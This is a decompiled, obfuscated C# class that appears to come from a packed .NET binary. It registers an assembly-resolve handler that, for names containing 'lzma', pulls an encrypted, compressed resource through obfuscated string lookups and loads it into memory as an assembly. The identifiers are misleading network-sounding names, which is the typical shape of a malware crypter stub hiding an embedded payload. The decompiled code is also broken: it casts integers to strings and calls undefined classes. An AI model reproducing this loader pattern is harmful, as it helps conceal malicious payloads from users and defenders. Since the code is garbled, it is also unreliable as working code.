using System;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;

public class DataCommand
{
	private string HttpResponseStreamAsyncResult;

	public DataCommand()
	{
		HttpResponseStreamAsyncResult = "lzma";
	}

	public Assembly UdpReceiveResult(object WebProxyScriptElement, ResolveEventArgs FilterElement)
	{
		//IL_0024: Expected O, but got I4
		//IL_0045: Expected O, but got I4
		if (SyntaxCheck(FilterElement.Name, HttpResponseStreamAsyncResult))
		{
			ResourceManager authenticationSchemes = SocketElement.HTTP_REQUEST_INFO_TYPE.ControlDataIPv6(ChainPolicyType.SafeThreadHandle((string)2, 76428), SocketElement.HttpListener.FlushCode());
			object objectValue = RuntimeHelpers.GetObjectValue(SocketElement.HTTP_REQUEST_INFO_TYPE.WSAMsg(authenticationSchemes, ChainPolicyType.SafeThreadHandle((string)3, 35249)));
			objectValue = SocketElement.CodeCompileUnit.CompressionLevel((byte[])objectValue, SocketElement.CodeCompileUnit.Socket());
			objectValue = SocketElement.CodeCompileUnit.BaseWebProxyFinder((byte[])objectValue);
			return SocketElement.HttpListener.ValueCollection((byte[])objectValue);
		}
		return null;
	}

	private bool SyntaxCheck(string ProcessThreadTimes, string ProcessLifetimeEntry)
	{
		if (ProcessThreadTimes.ToLower().Contains(ProcessLifetimeEntry))
		{
			return true;
		}
		return false;
	}
}
